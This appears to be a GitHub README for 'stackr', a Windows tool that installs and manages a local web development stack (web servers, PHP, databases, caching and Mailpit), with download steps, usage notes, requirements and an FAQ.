# ⚙️ stackr - Manage your local website projects easily

[https://img.shields.io/badge/Download-Stackr-blue](https://github.com/xcv-thyronine317/stackr/releases)

Stackr provides a simple way to run web projects on your computer. It acts as a control center for your website files and databases. You no longer need to install complex software one piece at a time. This tool installs and manages everything you need for web development in one package. It runs on Windows and works for beginners and professionals.

## 📦 What is stackr?

Development projects require several tools to function. You need a web server to show pages, a database to store information, and a way to send test emails. Stackr bundles these tools into one interface. You click a button to start your server. You click another to stop it. It mimics how websites behave on the live internet. This process helps you build and test sites before you publish them to the world.

Stackr includes:
* Web servers: Apache and Nginx options.
* Languages: PHP versions for your scripts.
* Databases: MySQL, MariaDB, and PostgreSQL.
* Caching: Redis and Memcached.
* Mail testing: Mailpit for viewing sent emails.

## 🚀 Getting Started

Follow these steps to set up the software. Ensure your computer uses Windows 10 or Windows 11.

1. Visit the [official releases page](https://github.com/xcv-thyronine317/stackr/releases).
2. Look for the file ending in .exe.
3. Download the file to your computer.
4. Open the downloaded file.
5. Follow the prompts on your screen to finish the installation.

## 🖥️ Using the software

When you open stackr, you see a clean dashboard. If you want to start a project, create a folder in your workspace directory. Tell stackr where this folder lives. Once you link the folder, the application configures your web server automatically.

To check your site, open your web browser. Type the address provided by the stackr dashboard into the top bar. You will see your files rendered as a website. 

### Starting servers
Click the Start All button to activate your services. The interface shows green lights when tools function. If a service faces a conflict, a red light appears. Check your logs to see why a service stopped.

### Database management
Stackr includes a built-in database manager. You can create new databases or import existing ones for your project. Choose between MySQL, MariaDB, or PostgreSQL based on your preference. 

### Testing emails
When your code tries to send an email, it reaches your Mailpit service instead of a real inbox. Open the Mailpit tab in the dashboard. You see every email your code sends here. This prevents you from sending test messages to real people.

## 🛠️ System Requirements

Stackr runs on most modern desktop machines. We recommend the following hardware to ensure smooth performance:

* Operating System: Windows 10 (64-bit) or Windows 11.
* Memory: 4 GB RAM minimum. 8 GB RAM is better.
* Storage: 500 MB of free space for the application. You need extra space for your project files and databases.
* Permissions: You need administrator access to allow the server to use computer ports.

## ❓ Frequently Asked Questions

### Can I run other web servers at the same time?
If you have other software like IIS or an old XAMPP installation running, they might use the same ports as stackr. Stop those other programs before you start the services in stackr.

### Where does stackr save my data?
The settings and database files stay in the folder you specify during the first setup. Keep regular backups of this folder to prevent data loss.

### Does this work with frameworks?
Yes. Stackr supports most PHP-based frameworks. Since it provides a standard environment, it handles software built with modern tools without extra configuration.

### How do I update stackr?
Download the newest installer from the releases link and run it. The new version replaces the old one while keeping your settings intact.

## 🔒 Security

Stackr is intended for local use only. Do not expose this local environment to the public internet. It lacks the hardened security features of a production server. Use it to build and test your work before you move it to a hosting provider.

Keywords: developer-tools, laragon-alternative, local-development, php, react, rust, tauri, typescript, web-development, windows